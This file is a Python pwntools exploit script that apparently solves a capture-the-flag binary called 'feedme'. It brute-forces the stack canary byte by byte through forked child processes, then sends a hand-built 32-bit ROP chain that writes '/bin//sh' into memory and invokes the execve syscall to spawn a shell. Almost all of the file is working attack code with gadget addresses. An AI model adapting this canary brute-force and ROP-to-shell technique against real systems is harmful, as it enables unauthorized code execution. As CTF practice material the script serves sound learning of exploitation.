from pwn import *
import argparse
from struct import pack


parser = argparse.ArgumentParser()
#parser.add_argument("--offset", type=int, required=True)
#parser.add_argument("--buffer_offset", type=int, required=True)
parser.add_argument("--debug", action='store_true', help="Enable debugging")
args = parser.parse_args()

def callGDB():
    #gdb.attach(io,'''
    #        set follow-fork-mode child
    #        show follow-fork-mode
    #        b *0x08049053
    #        b *0x08049066
    #        b *0x08049081
    #        r
    #    ''')


    gdb.attach(io,'''
            set follow-fork-mode child
            b *0x080490a0
            
      ''')


def bruteForce_canary():
    #We know that the first byte of the stack canary has to be \x00 since it is null terminated,
    #keep the values we know for the canary in known_canary
    known_canary = b"\x00"

    input_numBytes = 0x22   # 34 bytes
    canary = 0x0
    hex_canary = "00"   # Ascii representation of the canary

    for byte in range(0, 3):
        print("Testing byte " + str(byte))
        log.info("Input size: "+hex(input_numBytes))
        for i in range(0, 0xff):
            
            log.info(b"Testing canary with value "+ known_canary + p8(canary))

            # send iput size
            io.send(p8(input_numBytes)) 
            io.send(b"A"*0x20 + known_canary + p8(canary))
            output = io.recvuntil(b"Child exit.")

            if b"YUM" in output:
                print("FOUND!!!!!!!!!!!!!!")
                known_canary = known_canary + p8(canary)
                #print(known_canary.hex()) #convert from byte to hex (in this case is little-endian). need to revert
                hex_canary = hex(canary).replace("0x","") + hex_canary
                input_numBytes = input_numBytes + 0x1
                
                canary = 0x0
                print(hex(int(hex_canary,16)))
                print("----------------------------------")
                print()
                break
            else:
                #canary byte value is not correct. Check next one
                canary = canary + 0x1

    return int(hex_canary,16)   # return number (integer) in base 10

context.arch='i386'
io = process('./feedme')

#gdb.attach(io)

io.recvuntil(b"FEED ME!\n")

canary = bruteForce_canary()

log.success("Canary value: "+hex(canary))

exploit = b"A"*0x20 + p32(canary)
exploit += b"B"*0xc # offset to eip (0x30 - 0x24)
#exploit += b"C"*24
exploit += p32(0x806f34a)       # pop edx ; ret
exploit += p32(0x080eaf84)      # bss address
exploit += p32(0x80bb496)       # pop eax ; ret
exploit += p32(0x6e69622f)      # /bin LE
exploit += p32(0x809a7ed)       # mov dword ptr [edx], eax ; ret

exploit += p32(0x806f34a)       # pop edx ; ret
exploit += p32(0x080eaf84+0x4)  # bss address
exploit += p32(0x80bb496)       # pop eax ; ret
exploit += p32(0x68732f2f)      # //sh LE
exploit += p32(0x809a7ed)       # mov dword ptr [edx], eax ; ret

exploit += p32(0x08054a10)      # xor eax, eax ; ret
exploit += p32(0x0807fc13)      # cdq ; ret)
exploit += p32(0x806f371)       # pop ecx ; pop ebx ; ret
exploit += p32(0x0)             # zero to put in ecx
exploit += p32(0x080eaf84)      # bss address
exploit += p32(0x80bb496)       # pop eax ; ret
exploit += p32(0xb)             # exeve syscall number
exploit += p32(0x8049761)       # int 0x80


#print(int(hex(len(exploit)).replace("0x",""),16))
io.send(p8(int(hex(len(exploit)),16)))
io.send(exploit)
io.recvuntil(b"ATE")

io.poll(block=True)
#io.interactive()





